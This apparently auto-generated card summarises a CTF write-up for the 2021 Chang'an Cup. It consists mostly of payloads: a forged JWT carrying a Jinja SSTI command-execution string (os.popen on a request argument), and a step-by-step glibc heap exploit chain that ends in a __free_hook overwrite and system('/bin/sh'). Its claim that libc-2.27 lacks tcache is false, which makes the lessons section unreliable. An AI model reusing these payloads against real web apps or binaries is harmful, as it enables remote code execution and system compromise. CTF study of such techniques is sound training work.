---
title: "长安杯-WriteUp"
category: web
tags: ["长安杯", "web", "Web-JWT-SSTI注入", "Heap-整数溢出-负数size", "off-by-null", "unsorted bin"]
signals: ["长安杯 2021", "Web-JWT-SSTI注入", "Heap-整数溢出-负数size", "off-by-null", "unsorted bin", "libc-2.27-Pwn", "Reverse", "ChaMd5-Venom", "auth_bypass", "Web", "JWT", "SSTI", "URL_for", "globals__"]
difficulty: medium
source: "https://www.ctfiot.com/1069.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 长安杯-WriteUp

> 赛事：长安杯 2021 | 方向：web | 难度：medium

## 一句话总结

长安杯2021:Web JWT+SSTI用户字段URL_for.__globals__.os.popen(request.args.cmd)|Pwn菜单add/edit/delete/show+整数溢出(负size)+off-by-null+libc-2.27+unsorted bin泄+__free_hook覆盖+system('/bin/sh')

## 攻击链

1. Web: JWT user=''{{url_for.__globals__.os.popen(request.args.cmd).read()}}'' passwd=123 role=admin uid=空|JWT签名伪造 HS256 secret=key|Pwn: add(0,0x28)+add(1,0x400)+add(2,0x68)+add(3,0x68)+add(4,0x50,/bin/sh)+sh.sendline(''1'') sendline(0) sendline(''-1'') 整数溢出+edit(0,0x10000, p64(0)*5+p64(0x411+0x70*2))+delete(1)+add(1,0x400)+show(2)泄libc+add(1,0x90, 0x68*''\x00''+p64(0x71)+p64(__free_hook))+add(2,0x60)+add(2,0x60,p64(system))+delete(4)→system(''/bin/sh'')

## 关键 payload

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0|add(0,0x28,'a') add(1,0x400,'a') add(2,0x68,'a') add(3,0x68,'a') add(4,0x50,'/bin/sh\x00') sendline('1') sendline(0) sendline('-1')|edit(0,0x10000, p64(0)*5+p64(0x411+0x70*2)) delete(1) add(1,0x400) show(2) libc.address=u64(recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-__malloc_hook-0x10|add(1,0x90, 0x68*'\x00'+p64(0x71)+p64(__free_hook)) add(2,0x60,'a') add(2,0x60,p64(system)) delete(4)
```

## 经验教训

1) JWT用户字段SSTI:HS256签名可逆向secret,user='{{url_for.__globals__.os.popen(request.args.cmd).read()}}'; 2) 整数溢出触发off-by:sendline('-1')→ size=0xFFFFFFFF+后续edit(0,0x10000) 任意堆写; 3) unsorted bin leak:0x400 chunk进入unsorted bin后fd指向main_arena; 4) libc-2.27无tcache:__free_hook直接覆盖; 5) 大小chunk混合:0x28+0x400+0x68*3+0x50(/bin/sh)

## 标签

Web-JWT-SSTI注入、Heap-整数溢出-负数size、off-by-null、unsorted bin、libc-2.27-Pwn、Reverse、ChaMd5-Venom

## 参考来源

- https://www.ctfiot.com/1069.html
- 原文件：长安杯-WriteUp.full.md
